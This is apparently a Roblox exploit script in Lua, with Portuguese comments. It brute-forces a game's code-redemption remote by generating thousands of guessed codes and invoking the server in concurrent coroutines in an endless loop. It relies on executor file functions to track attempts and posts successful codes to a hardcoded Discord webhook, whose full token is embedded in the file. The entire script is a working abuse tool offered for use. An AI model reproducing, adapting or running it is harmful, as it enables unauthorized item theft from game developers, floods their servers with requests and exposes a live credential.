local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RedeemCode = ReplicatedStorage:WaitForChild("RedeemCode")

local webhookUrl = "https://discord.com/api/webhooks/1243747786088910900/6UiTCE_9-M1yjJOaEnevNpe8y43tk36xXqbCKqz4gdlDfTjZPDDfhDaSaYXgAPYq42gx"
local testedCodesFile = "tested_codes.txt"
local concurrentThreads = 10 -- Número de corrotinas simultâneas

local function sendToDiscord(code)
    local data = {
        ["content"] = "Possibly found an item with the code: " .. code
    }
    local jsonData = HttpService:JSONEncode(data)

    HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
end

local function loadTestedCodes()
    local testedCodes = {}

    if isfile(testedCodesFile) then
        local content = readfile(testedCodesFile)
        for code in string.gmatch(content, "[^\r\n]+") do
            testedCodes[code] = true
        end
    end

    return testedCodes
end

local function saveTestedCode(code)
    appendfile(testedCodesFile, code .. "\n")
end

local function generateCodes()
    local possibleCodes = {}

    -- Códigos mais simples
    local simpleCodes = {"Sword", "Foice", "FreeUgc", "firstSword", "Magic", "Prize", "Gift"}
    for _, code in ipairs(simpleCodes) do
        table.insert(possibleCodes, code)
    end

    -- Códigos com sufixos numéricos
    for i = 1, 999 do
        for _, prefix in ipairs(simpleCodes) do
            table.insert(possibleCodes, prefix .. i)
        end
    end

    -- Códigos mais complexos (combinando palavras)
    local complexPrefixes = {"Mega", "Ultra", "Pro", "Epic", "Legend"}
    for _, complex in ipairs(complexPrefixes) do
        for _, code in ipairs(simpleCodes) do
            table.insert(possibleCodes, complex .. code)
        end
    end

    -- Códigos complexos com sufixos numéricos
    for i = 1, 999 do
        for _, prefix in ipairs(complexPrefixes) do
            for _, code in ipairs(simpleCodes) do
                table.insert(possibleCodes, prefix .. code .. i)
            end
        end
    end

    return possibleCodes
end

local function testCode(code, testedCodes)
    if testedCodes[code] then
        print("Code already tested: " .. code)
        return
    end

    local args = {
        [1] = code
    }
    local success = RedeemCode:InvokeServer(unpack(args))

    if success then
        sendToDiscord(code)
    else
        saveTestedCode(code)
        testedCodes[code] = true
    end
end

local function runConcurrentTests(allCodes, testedCodes)
    local index = 1

    local function testCodesInCoroutine()
        while index <= #allCodes do
            local code = allCodes[index]
            index = index + 1
            testCode(code, testedCodes)
        end
    end

    local threads = {}
    for i = 1, concurrentThreads do
        threads[i] = coroutine.create(testCodesInCoroutine)
    end

    for i = 1, concurrentThreads do
        coroutine.resume(threads[i])
    end
end

-- Loop infinito para continuar testando códigos
while true do
    -- Carregar os códigos já testados
    local testedCodes = loadTestedCodes()

    -- Gerar todos os códigos possíveis
    local allCodes = generateCodes()

    -- Testar os códigos de forma concorrente
    runConcurrentTests(allCodes, testedCodes)

    -- Esperar um tempo antes de reiniciar o loop
    wait(5)  -- Ajuste o tempo de espera conforme necessário
end
